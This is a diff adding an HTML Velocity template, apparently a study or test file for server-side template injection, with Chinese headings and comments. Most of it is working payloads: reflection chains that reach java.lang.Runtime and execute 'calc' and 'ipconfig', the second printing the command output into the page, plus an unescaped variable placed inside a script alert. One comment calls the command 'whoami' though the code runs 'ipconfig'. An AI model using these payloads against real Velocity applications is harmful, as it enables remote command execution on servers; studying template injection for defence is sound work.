@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+hello , ${name} !
+
+
+<h1>方法引用</h1>
+常规语法：$now.getTime()
+正规语法：${now.getTime()}
+
+<h1>指令测试</h1>
+
+    #if($msg)
+        <script>
+            alert('$!msg');
+        </script>
+    #end
+
+<h1>命令执行</h1>
+    #set($e="e")
+    $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
+
+<h1>命令执行2</h1>
+    #set($x='')##
+    # 设置一个空字符串变量$x，后续操作将基于这个变量进行类的加载和方法的调用。
+
+    #set($rt = $x.class.forName('java.lang.Runtime'))##
+    # 通过$x加载java.lang.Runtime类，为后续执行系统命令做准备。
+
+    #set($chr = $x.class.forName('java.lang.Character'))##
+    # 加载java.lang.Character类，用于字符转换。
+
+    #set($str = $x.class.forName('java.lang.String'))##
+    # 加载java.lang.String类，用于字符串操作。
+
+    #set($ex=$rt.getRuntime().exec('ipconfig'))##
+    # 执行系统命令'whoami'，并将其执行结果存储在$ex变量中。
+
+    $ex.waitFor()
+    # 等待系统命令执行完成，确保后续操作是对完整的执行结果进行处理。
+
+    #set($out=$ex.getInputStream())##
+    # 从$ex中获取输入流，用于读取系统命令的执行结果。
+
+    #foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+    # 遍历输入流中的每个字符，将其转换为字符串并输出，实现系统命令执行结果的打印。
+
+
+</body>
+</html>
